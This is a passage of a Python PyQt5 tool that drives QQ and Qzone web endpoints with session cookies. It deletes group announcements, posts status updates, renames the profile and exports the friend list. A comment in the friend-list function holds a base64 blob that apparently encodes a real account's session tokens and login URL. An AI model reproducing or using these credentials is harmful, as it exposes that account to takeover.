            QtWidgets.QMessageBox.critical(self, "错误", "请关闭正在打开mem_list.csv的文件!")
        except Exception as e:
            QtWidgets.QMessageBox.about(self, "错误", "未知错误!")

    def del_notice(self,fid, bkn, qid, skey, pskey,uin):
        data = {
            "qid": qid,
            "bkn": bkn,
            "fid":fid
        }
        headers = {
            "Referer": "https://web.qun.qq.com/mannounce/index.html?_wv=1031&_bid=148",
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; MI 8 Build/QKQ1.190910.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/109.0.5414.86 MQQBrowser/6.2 TBS/046715 Mobile Safari/537.36 V1_AND_SQ_8.9.78_4548_YYB_D QQ/8.9.78.12275 NetType/WIFI WebP/0.3.0 AppId/537175315 Pixel/1080 StatusBarHeight/82 SimpleUISwitch/0 QQTheme/2099 StudyMode/0 CurrentMode/0 CurrentFontScale/1.0 GlobalDensityScale/0.9818182 AllowLandscape/false InMagicWin/0",
            "Host": "web.qun.qq.com",
            "Origin": "https://web.qun.qq.com"
        }
        Cookies = {
            "p_skey": pskey,
            "uin": str(uin),
            "skey": skey,
            "p_uin": str(uin)
        }
        requests.post(f"https://web.qun.qq.com/cgi-bin/announce/del_feed?bkn={bkn}", json=data,params=data,headers=headers, cookies=Cookies)
        QtWidgets.QMessageBox.about(self, "提示", "删除成功!")
    def new_emotion(self,g_tk,content,uin,skey,pskey):
        Cookies = {
            "p_skey": pskey,
            "uin": str(uin),
            "skey": skey,
            "p_uin": str(uin)
        }
        headers = {
            "Referer": f"https://user.qzone.qq.com/{str(uin)[1:]}",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36 Edg/123.0.0.0",
            "Origin": "https://user.qzone.qq.com"
        }
        data = {
    "syn_tweet_verson":"1",
    "paramstr":"1",
    "pic_template":"",
    "richtype":"",
    "richval":"",
    "special_url":"",
    "subrichtype":"",
    "who":"1",
    "con":f"{content}",
    "feedversion":"1",
    "ver":"1",
    "ugc_right":"1",
    "to_sign":"0",
    "hostuin":f"{str(uin)[1:]}",
    "code_version":"1",
    "format":"fs",
    "qzreferrer":f"https://user.qzone.qq.com/{str(uin)[1:]}"
}
        print(requests.post(f"https://user.qzone.qq.com/proxy/domain/taotao.qzone.qq.com/cgi-bin/emotion_cgi_publish_v6?&g_tk={g_tk}", data=data,headers=headers,params=data,cookies=Cookies).text)
        QtWidgets.QMessageBox.about(self, "提示", "发布成功!")
    def change_name(self,g_tk,skey,pskey,newname,uin):
        Cookies = {
            "p_skey": pskey,
            "uin": str(uin),
            "skey": skey,
            "p_uin": str(uin)
        }
        headers = {
            "Referer": f"https://user.qzone.qq.com/",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36 Edg/123.0.0.0",
            "Origin": "https://user.qzone.qq.com"
        }
        data = {
    "nickname":f"{newname}",
    "emoji":"",
    "sex":"1",
    "birthday":"1900-1-1",
    "province":"44",
    "city":"0",
    "country":"1",
    "marriage":"0",
    "bloodtype":"5",
    "hp":"0",
    "hc":"0",
    "hco":"0",
    "career":"",
    "company":"",
    "cp":"0",
    "cc":"0",
    "cb":"",
    "cco":"0",
    "lover":"",
    "islunar":"0",
    "mb":"1",
    "uin":f"{str(uin)[1:]}",
    "pageindex":"1",
    "fupdate":"1",
    "qzreferrer":"https://user.qzone.qq.com/proxy/domain/qzs.qq.com/qzone/v6/setting/profile/profile.html?tab=base",
    "g_iframeUser":"1"
}
        requests.post(
            f"https://h5.qzone.qq.com/proxy/domain/w.qzone.qq.com/cgi-bin/user/cgi_apply_updateuserinfo_new?&g_tk={g_tk}",
            data=data, headers=headers, params=data, cookies=Cookies)
        QtWidgets.QMessageBox.about(self, "提示", "修改成功!")
    def get_friend_list(self, g_tk, uin, pskey, skey):
        Cookies = {
            "p_skey": pskey,
            "uin": str(uin),
            "skey": skey,
            "p_uin": str(uin)
        }
        headers = {
            "Referer": f"https://user.qzone.qq.com/",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36 Edg/123.0.0.0",
            "Origin": "https://user.qzone.qq.com"
        }
        data = {
    "uin":str(uin)[1:],
    "do":"1",
    "rd":f"0.{time.time()}",
    "fupdate":"1",
    "clean":"1",
    "g_tk":g_tk
}
        res = requests.get("https://user.qzone.qq.com/proxy/domain/r.qzone.qq.com/cgi-bin/tfriend/friend_ship_manager.cgi",params=data,cookies=Cookies,headers=headers,json=data,data=data).text[10:-2]
        friend_list = json.loads(res).get("data").get("items_list")
        #eyJ1aW4iOiAibzI3Mzc5MTcyODgiLCAic2tleSI6ICJAaWFBYTRINzFsIiwgInBza2V5IjogIkNkdnM4b2xIcGRraXRBcGRGa2x5RC1tSnpOYUpjWWVZYWlteXBLN1hnZHdfIiwgImNvb2tpZSI6IHsic2tleSI6ICJAaWFBYTRINzFsIiwgInVpbiI6ICJvMjczNzkxNzI4OCIsICJwX3NrZXkiOiAiQ2R2czhvbEhwZGtpdEFwZEZrbHlELW1Kek5hSmNZZVlhaW15cEs3WGdkd18iLCAicF91aW4iOiAibzI3Mzc5MTcyODgiLCAicHQ0X3Rva2VuIjogIkg3NHZCTEh0MERMKm5qaDMxdUJLTG5GZDBxeDdzVzRxTUw1VWVCbmotQWdfIn0sICJnX3RrIjogMTgyNTUxMzQxNSwgInF6b25lX3VybCI6ICJodHRwczovL3B0bG9naW4yLnF6b25lLnFxLmNvbS9jaGVja19zaWc/cHR0eXBlPTEmdWluPTI3Mzc5MTcyODgmc2VydmljZT1wdHFybG9naW4mbm9kaXJlY3Q9MCZwdHNpZ3g9MTczZjJhNDI3MmE5ZmU2NWUyMmY1ZmFkYzE1NTIzZDk1OWJhNjc4NGM4YTQ5NmQ1NzJiOTJlNDY1YzhiYWI2NDI3YjY1ZDgxY2IzZDA2NWRiOWU1ZGYyZDNkMDFkNjExZDM1ZmY5ZDE5NmM5YmNkNjY1YTQ1Y2VjODM5ZmE5NThlM2MyNjM5YTdjYWYyMjg0JnNfdXJsPWh0dHBzJTNBJTJGJTJGcXpzLnFxLmNvbSUyRnF6b25lJTJGdjUlMkZsb2dpbnN1Y2MuaHRtbCUzRnBhcmElM0Rpem9uZSZmX3VybD0mcHRsYW5nPTIwNTImcHRyZWRpcmVjdD0xMDAmYWlkPTU0OTAwMDkxMiZkYWlkPTUmal9sYXRlcj0wJmxvd19sb2dpbl9ob3VyPTAmcmVnbWFzdGVyPTAmcHRfbG9naW5fdHlwZT0zJnB0X2FpZD0wJnB0X2FhaWQ9MTYmcHRfbGlnaHQ9MCZwdF8zcmRfYWlkPTAifQ==
        try:
            with open("friend_list.csv",'w',encoding='utf-8-sig',newline='') as f:
                csv_f = csv.writer(f)
                csv_f.writerow(['名称','QQ号','头像地址'])
                for i in friend_list:
                    csv_f.writerow([i['name']+"\t",str(i['uin'])+"\t",i['img']])
            QtWidgets.QMessageBox.about(self, "提示", "已保存至friend_list.csv!")
        except PermissionError:
            QtWidgets.QMessageBox.critical(self, "错误", "请关闭正在打开friend_list.csv的文件!")
        except Exception as e:
            QtWidgets.QMessageBox.about(self, "错误", "未知错误!")

if __name__ == '__main__':
    #获取UIC窗口操作权限
    app = QtWidgets.QApplication(sys.argv)
    MainWindow = QtWidgets.QMainWindow()
    #调自定义的界面（即刚转换的.py对象）
    Ui = Ui_MainWindow()
    Ui.setupUi(MainWindow)
    #显示窗口并释放资源
    MainWindow.show()
    sys.exit(app.exec_())
